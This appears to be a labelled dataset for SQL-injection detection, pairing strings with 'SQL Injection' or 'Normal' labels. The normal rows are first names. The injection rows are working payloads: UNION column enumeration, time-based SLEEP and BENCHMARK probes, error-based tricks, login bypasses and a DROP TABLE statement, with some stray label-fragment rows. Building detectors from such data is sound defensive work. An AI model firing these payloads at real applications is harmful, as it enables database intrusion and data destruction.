"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#'",SQL Injection
'Hank',Normal
'Jill',Normal
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'",SQL Injection
'David',Normal
'Eve',Normal
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'",SQL Injection
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'Fran',Normal
"'UNION ALL SELECT 1,2,3,4,5'",SQL Injection
'ORDER BY 28#',SQL Injection
'John',Normal
'Jill',Normal
'Bob',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
'')) or pg_sleep(5)--',SQL Injection
'Jill',Normal
'Eve',Normal
"'-1 UNION SELECT 1 INTO @,@'",SQL Injection
'Bob',Normal
'UNION ALL SELECT 1--',SQL Injection
'Fran',Normal
'Jill',Normal
'John',Normal
'Bob',Normal
'Jill',Normal
'Charlie',Normal
'Fran',Normal
'Alice',Normal
'Charlie',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
"'""""'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#'",SQL Injection
'Eve',Normal
'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'",SQL Injection
'Bob',Normal
'ORDER BY 29',SQL Injection
'Eve',Normal
'David',Normal
'Hank',Normal
'AND 7506=9091 AND (5913=5913',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#'",SQL Injection
'Grace',Normal
'Grace',Normal
'Grace',Normal
'John',Normal
'John',Normal
'Charlie',Normal
'ORDER BY 14',SQL Injection
'ORDER BY 8#',SQL Injection
'Jill',Normal
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'Jill',Normal
'Hank',Normal
'Alice',Normal
"'1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
'ORDER BY 24',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
'Hank',Normal
'Hank',Normal
'UNION ALL SELECT 1--',SQL Injection
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
'ORDER BY 26',SQL Injection
'ORDER BY 26#',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),4'",SQL Injection
'1*56',SQL Injection
''''''''''''''UNION SELECT '2',SQL Injection
'David',Normal
'Alice',Normal
'Bob',Normal
'Hank',Normal
'Jill',Normal
'Alice',Normal
'Charlie',Normal
'Charlie',Normal
'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
"'admin"""") or (""""1""""=""""1""""/*'",SQL Injection
'Jill',Normal
"',(select * from (select(sleep(10)))a)'",SQL Injection
''));,SQL Injection
'Hank',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
'David',Normal
'Grace',Normal
"'ORDER BY 1,SLEEP(5)#'",SQL Injection
'pg_SLEEP(5)#',SQL Injection
'Charlie',Normal
'David',Normal
'John',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11'",SQL Injection
"'admin"""" or """"1""""=""""1'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11'",SQL Injection
"'ORDER BY 1,SLEEP(5)#'",SQL Injection
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2'",SQL Injection
'Jill',Normal
'%' AND 8310=8310 AND '%'='',SQL Injection
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
'Bob',Normal
'Alice',Normal
'Fran',Normal
'Bob',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'ORDER BY 19--',SQL Injection
'Bob',Normal
'Grace',Normal
"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
'Bob',Normal
'Jill',Normal
'John',Normal
'OR 3409=3409 AND ('pytW' LIKE 'pytY',SQL Injection
'John',Normal
'Fran',Normal
'Eve',Normal
'Hank',Normal
'Eve',Normal
'Fran',Normal
',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
'HAVING 1=0',SQL Injection
'Hank',Normal
'Hank',Normal
'Eve',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),3,4#'",SQL Injection
'David',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#'",SQL Injection
'or SLEEP(5)='',SQL Injection
'Grace',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--'",SQL Injection
'Fran',Normal
'Hank',Normal
'Eve',Normal
'ORDER BY 30',SQL Injection
'Alice',Normal
"'""""));",SQL Injection
'Alice',Normal
'&&SLEEP(5)--',SQL Injection
'Hank',Normal
'Charlie',Normal
'Charlie',Normal
'John',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
'Eve',Normal
'Bob',Normal
'Bob',Normal
"'""""-""""'",SQL Injection
'AND 1=0--',SQL Injection
';',SQL Injection
'Jill',Normal
'Grace',Normal
'Fran',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
"'and (select substring(@@version,3,1))='c''",SQL Injection
'ORDER BY 20--',SQL Injection
Microservice running on port 7564,Normal
'Charlie',Normal
"''\""""'",SQL Injection
'David',Normal
"'and (select substring(@@version,1,1))='M''",SQL Injection
'Grace',Normal
'Charlie',Normal
''=0--+',SQL Injection
'John',Normal
'OR 3409=3409 AND ('pytW' LIKE 'pytY',SQL Injection
'Bob',Normal
'Jill',Normal
'Bob',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--'",SQL Injection
'John',Normal
'admin' or '1'='1'/*',SQL Injection
"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'",SQL Injection
'Charlie',Normal
"'"""")) or ((""""x""""))=((""""x'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#'",SQL Injection
'Grace',Normal
'Hank',Normal
'ORDER BY 15--',SQL Injection
'Hank',Normal
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
'Grace',Normal
'Alice',Normal
'pg_SLEEP(5)',SQL Injection
'Jill',Normal
'John',Normal
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
'Bob',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6'",SQL Injection
'OR x=x--',SQL Injection
'Eve',Normal
'Alice',Normal
'Grace',Normal
'Charlie',Normal
'Grace',Normal
''; DROP TABLE users; --',SQL Injection
''&'',SQL Injection
'David',Normal
'David',Normal
'Charlie',Normal
'David',Normal
'Bob',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))'",SQL Injection
'David',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
'Fran',Normal
'UNION ALL SELECT 1',SQL Injection
'ORDER BY 31337#',SQL Injection
'John',Normal
'Fran',Normal
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'",SQL Injection
'John',Normal
'admin' or '1'='1'#',SQL Injection
'David',Normal
'Charlie',Normal
'Jill',Normal
'Fran',Normal
"'"""" or true--'",SQL Injection
'Fran',Normal
"'1234 """" AND 1=0 UNION ALL SELECT """"admin"""", """"81dc9bdb52d04dc20036dbd8313ed055'",SQL Injection
'Fran',Normal
'John',Normal
'Bob',Normal
'Jill',Normal
'Grace',Normal
'John',Normal
"'' AND MID(VERSION(),1,1) = '5';'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--'",SQL Injection
'Bob',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12'",SQL Injection
'John',Normal
'Bob',Normal
'ORDER BY 31337#',SQL Injection
'Bob',Normal
"'ORDER BY 1,SLEEP(5)#'",SQL Injection
'Hank',Normal
'Alice',Normal
'Eve',Normal
'Grace',Normal
'John',Normal
'OR x=y',SQL Injection
"'' or """"'",SQL Injection
'Fran',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
"'') or benchmark(10000000,MD5(1))#'",SQL Injection
'Fran',Normal
'UNION ALL SELECT SLEEP(5)--',SQL Injection
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'ORDER BY 24--',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
'Bob',Normal
'Alice',Normal
'Hank',Normal
'Bob',Normal
'Grace',Normal
'Alice',Normal
'Alice',Normal
'John',Normal
'Hank',Normal
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'",SQL Injection
'Jill',Normal
'David',Normal
"'"""" or sleep(5)#'",SQL Injection
'Bob',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
'John',Normal
'Eve',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'Jill',Normal
'John',Normal
"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
"'' or """"'",SQL Injection
'Grace',Normal
''''''''''''''UNION SELECT '2',SQL Injection
'Eve',Normal
'Finding the table name',SQL Injection
'Bob',Normal
'Bob',Normal
'Grace',Normal
'John',Normal
'David',Normal
'Grace',Normal
'admin' or 1=1#',SQL Injection
'ORDER BY 8#',SQL Injection
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
'David',Normal
'Eve',Normal
'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
'Hank',Normal
'Grace',Normal
'Alice',Normal
'John',Normal
'Alice',Normal
'David',Normal
'Bob',Normal
'Jill',Normal
'Alice',Normal
'ORDER BY 24',SQL Injection
'%' AND 8310=8310 AND '%'='',SQL Injection
'' or ''*'',SQL Injection
'Grace',Normal
"'-1 UNION SELECT 1 INTO @,@,@'",SQL Injection
'ORDER BY 28#',SQL Injection
'Jill',Normal
'Hank',Normal
'Bob',Normal
'Fran',Normal
'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--',SQL Injection
'Bob',Normal
'Hank',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
'Alice',Normal
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'",SQL Injection
'Bob',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
'') or sleep(5)='',SQL Injection
'David',Normal
'ORDER BY 18',SQL Injection
'Jill',Normal
'admin' or 1=1--',SQL Injection
'ORDER BY 14#',SQL Injection
'Grace',Normal
'1' ORDER BY 2--+',SQL Injection
'Bob',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9'",SQL Injection
'John',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--'",SQL Injection
''='',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Fran',Normal
'Charlie',Normal
'Grace',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'AND 1=1--',SQL Injection
'Grace',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#'",SQL Injection
'Eve',Normal
'Alice',Normal
'David',Normal
'Grace',Normal
'Eve',Normal
'Time-Based:',SQL Injection
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
'Jill',Normal
'Alice',Normal
'Bob',Normal
"'""""""""'",SQL Injection
'UNION ALL SELECT 'INJ'||'ECT'||'XXX'#',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'",SQL Injection
"'"""" """"'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--'",SQL Injection
'Jill',Normal
'Bob',Normal
'HAVING 1=0#',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'John',Normal
'waitfor delay '00:00:05'#',SQL Injection
"'UNION ALL SELECT 1,2#'",SQL Injection
'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
'John',Normal
'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--'",SQL Injection
'Fran',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
''));,SQL Injection
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--'",SQL Injection
'AS INJECTX WHERE 1=1 AND 1=1',SQL Injection
'Eve',Normal
'Charlie',Normal
'Charlie',Normal
'ORDER BY 31337#',SQL Injection
'John',Normal
"'admin"""") or (""""1""""=""""1""""--'",SQL Injection
'Bob',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'",SQL Injection
'Alice',Normal
'David',Normal
'Bob',Normal
'Bob',Normal
'John',Normal
'Grace',Normal
'John',Normal
'ORDER BY 24#',SQL Injection
'admin' or '1'='1'/*',SQL Injection
'' OR EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
"'UNION ALL SELECT 1,2,3#'",SQL Injection
'John',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12'",SQL Injection
'Fran',Normal
'Alice',Normal
'1)) or sleep(5)#',SQL Injection
'Bob',Normal
'Charlie',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))--'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--'",SQL Injection
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'",SQL Injection
'pg_SLEEP(5)#',SQL Injection
'Bob',Normal
'AND 1=0#',SQL Injection
'Fran',Normal
'Fran',Normal
"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--'",SQL Injection
'John',Normal
'David',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT 1,2,3,4,5,6--'",SQL Injection
'Jill',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
'Bob',Normal
'/*  	C-style comment',SQL Injection
"'""""*""""'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
'Hank',Normal
'1)) or sleep(5)#',SQL Injection
'David',Normal
'Alice',Normal
'Jill',Normal
'Charlie',Normal
'Eve',Normal
'ORDER BY 1',SQL Injection
'Charlie',Normal
'Fran',Normal
'Fran',Normal
'Eve',Normal
'John',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'",SQL Injection
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#'",SQL Injection
'Bob',Normal
'Jill',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))'",SQL Injection
'Bob',Normal
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'",SQL Injection
'Hank',Normal
"'"""") or (""""x"""")=(""""x'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7'",SQL Injection
'Fran',Normal
'Charlie',Normal
'Fran',Normal
'John',Normal
'Eve',Normal
'John',Normal
'Charlie',Normal
'Jill',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13'",SQL Injection
'Grace',Normal
"'""""));",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
'Bob',Normal
'Bob',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10'",SQL Injection
'Hank',Normal
''',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#'",SQL Injection
'Hank',Normal
'1' ORDER BY 2--+',SQL Injection
'Alice',Normal
'Charlie',Normal
'Hank',Normal
'Eve',Normal
'Eve',Normal
'David',Normal
'John',Normal
'ORDER BY 24--',SQL Injection
';,SQL Injection
'Alice',Normal
'David',Normal
'Bob',Normal
'Jill',Normal
'Grace',Normal
'Fran',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'Charlie',Normal
"'"""" or pg_sleep(5)--'",SQL Injection
'ORDER BY 23',SQL Injection
'Bob',Normal
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
'John',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'",SQL Injection
